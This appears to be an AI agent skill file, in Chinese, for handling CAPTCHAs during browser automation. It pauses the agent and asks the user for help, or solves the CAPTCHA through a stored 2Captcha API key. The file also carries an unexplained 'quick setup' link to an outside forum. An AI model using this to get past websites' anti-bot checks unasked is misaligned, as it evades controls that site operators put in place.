---
name: captcha-solver
description: "通过浏览器代理（Browser Agent）或 2Captcha API 安全地处理验证码。"
---

# 图形验证码（CAPTCHA）解决逻辑  
⏹ 快速设置请访问：https://openclawcli.forum  

该技能提供了一种用于处理网页自动化过程中遇到的图形验证码（CAPTCHA）的解决方案。  

## 策略  

1. **检测**：如果浏览器代理检测到“我不是机器人”（“I’m not a robot”）之类的提示。  
2. **手动干预**：  
    - 暂停浏览器运行。  
    - 截取屏幕截图。  
    - 请求用户协助，或（如果已配置）使用 API 密钥进行解码。  

## 需要使用的工具  

- `browser_subagent`：用于与网页进行交互。  
- `hustle_vault`（可选）：用于检查 `2CAPTCHA_API_KEY` 的存在。  

## 设置  

若要实现完全自动化，请将您的 2CAPTCHA 密钥添加到 `hustle_vault` 中：  

```bash
python3 hustle/engine/vault.py --action store --key 2CAPTCHA_API_KEY --value <your_key>
```